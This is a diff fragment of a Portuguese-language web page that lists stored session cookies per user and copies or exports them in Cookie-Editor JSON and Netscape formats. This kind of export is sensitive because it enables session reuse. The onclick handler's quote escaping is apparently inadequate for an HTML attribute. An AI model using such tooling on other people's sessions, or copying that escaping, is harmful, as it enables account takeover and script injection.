+            <td class="mono">${escapeHtml(c.path || "/")}</td>
+            <td>${exp}</td>
+            <td><span class="${c.httpOnly ? 'tag-true' : 'tag-false'}">${c.httpOnly ? 'SIM' : 'NÃO'}</span></td>
+            <td><span class="${c.secure ? 'tag-true' : 'tag-false'}">${c.secure ? 'SIM' : 'NÃO'}</span></td>
+            <td>
+              <div class="val-box mono" title="${escapeHtml(c.value)}">${escapeHtml(valTrunc)}</div>
+            </td>
+            <td style="text-align: right;">
+              <button class="icon-btn" type="button" title="Copiar valor do cookie" onclick="copiarTexto('${escapeQuotes(c.value)}', '${escapeQuotes(c.name)}')">
+                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"/><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"/></svg>
+              </button>
+            </td>
+          </tr>
+        `;
+      });
+
+      tbodyCookies.innerHTML = html;
+    }
+
+    // Filtros de domínio
+    const domainFiltersBox = document.getElementById("domain-filters");
+    if (domainFiltersBox) {
+      domainFiltersBox.querySelectorAll("button").forEach(btn => {
+        btn.addEventListener("click", () => {
+          domainFiltersBox.querySelectorAll("button").forEach(b => {
+            b.style.background = "transparent";
+            b.style.color = "var(--text-muted)";
+            b.style.borderColor = "transparent";
+            b.classList.remove("active");
+          });
+          btn.style.background = "var(--accent-green-subtle)";
+          btn.style.color = "var(--accent-green)";
+          btn.style.borderColor = "rgba(2, 215, 47, 0.4)";
+          btn.classList.add("active");
+          filtroDominioAtivo = btn.getAttribute("data-domain") || "all";
+          if (sessaoData) renderizarCookies(sessaoData.cookies || []);
+        });
+      });
+    }
+
+    function escapeHtml(str) {
+      if (!str) return "";
+      return String(str)
+        .replace(/&/g, "&amp;")
+        .replace(/</g, "&lt;")
+        .replace(/>/g, "&gt;")
+        .replace(/"/g, "&quot;")
+        .replace(/'/g, "&#039;");
+    }
+
+    function escapeQuotes(str) {
+      if (!str) return "";
+      return String(str).replace(/'/g, "\\'").replace(/"/g, "\\\"");
+    }
+
+    btnCopiarCookieEditor.addEventListener("click", () => {
+      if (sessaoData && sessaoData.cookie_editor_json) {
+        copiarTexto(JSON.stringify(sessaoData.cookie_editor_json, null, 2), "Cookies para Cookie-Editor");
+      } else if (sessaoData && sessaoData.cookies) {
+        copiarTexto(JSON.stringify(sessaoData.cookies, null, 2), "Cookies");
+      }
+    });
+
+    btnBaixarJson.addEventListener("click", () => {
+      const u = (sessaoData && sessaoData.usuario) || usuarioParam || "";
+      const url = u ? `/api/sessao/${encodeURIComponent(u)}/exportar?formato=json` : `/api/sessao/exportar?formato=json`;
+      window.location.href = url;
+    });
+
+    btnBaixarTxt.addEventListener("click", () => {
+      const u = (sessaoData && sessaoData.usuario) || usuarioParam || "";
+      const url = u ? `/api/sessao/${encodeURIComponent(u)}/exportar?formato=netscape` : `/api/sessao/exportar?formato=netscape`;
+      window.location.href = url;
+    });
+
+    carregarSeletorUsuariosSessao();
+    carregarSessao();
+  </script>
+</body>
+</html>
